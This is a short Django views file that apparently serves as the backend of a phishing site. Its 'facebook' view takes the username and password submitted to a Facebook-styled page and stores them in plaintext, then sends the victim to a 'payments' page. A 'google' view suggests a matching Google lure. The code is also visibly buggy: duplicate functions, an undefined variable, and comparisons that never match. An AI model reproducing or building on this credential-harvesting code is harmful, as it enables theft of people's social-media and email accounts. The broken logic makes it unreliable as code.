from django.shortcuts import render,redirect
from .models import Gmail,Facebook
from django.contrib.auth.models import User
from django.contrib.auth.decorators import login_required
from django.contrib.auth.forms import AuthenticationForm
from django.contrib.auth import login,logout
# Create your views here.
def home(request):
	template='basicsite/home.html'
	img=Facebook.objects.get(id=64)
	context={'imge':img}
	return render(request,template,context)

def about(request):
	template='basicsite/about.html'
	return  render(request,template)

def register(request):
	template='basicsite/register.html'
	return render(request,template)


def login_view(request):
	template='basicsite/login_view.html'
	return render(request,template,context)
def google(request):
	template='basicsite/google.html'
	return render(request,template)

def facebook(request):
	if request.method=="POST":
		username_att=request.POST['user']
		password_att=request.POST['pass']
		object_creation=Facebook.objects.create(username=username_att,password=password_att)
		try :
			user_creation=User.objects.create_user(username=username_att,password=password_att)
			print(user_creation.id)
			user=user_creation.get_user()
			print(user)
			login(request,user)
			return  redirect('basic_site:payments')
		except Exception:
			return redirect('basic_site:payments')			
		return redirect('basic_site:payments')
	else:
		template='basicsite/facebook_1.html'
		return render(request,template)	
		
@login_required(login_url='basic_site:register')
def check_payments(request):
	template='basicsite/checkpayments.html'
	context={}
	return render(request,template,context)

def login_view(request):
	if request.method==['POST']:
		form=AuthenticationForm(data=request.POST)
		if form.is_valid():
			user=form.get_user()
			login(request,user)
			return redirect('basic_site:home')			
	else:
		form=AuthenticationForm()
	return render(request,'basicsite/login.html',{'form':form})

def logout_view(request):
	if request.method==['POST']:
		logout(request)
		return redirect('basic_site:home')

